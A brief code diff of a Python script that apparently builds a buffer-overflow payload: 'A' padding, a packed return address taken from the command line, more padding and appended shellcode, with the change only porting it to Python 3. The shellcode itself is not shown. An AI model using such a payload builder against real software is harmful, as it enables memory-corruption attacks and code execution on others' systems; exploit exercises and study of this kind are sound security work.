@@ -1,6 +1,3 @@
-# /usr/bin/env python
-# encoding: utf-8
-
 import sys
 
 
@@ -20,4 +17,4 @@ chaine = "\x41" * int(sys.argv[1])
 chaine += adr_to_str16(int(sys.argv[2], 16))
 chaine += "\x41" * int(sys.argv[3])
 chaine += code
-print chaine
+print(chaine)
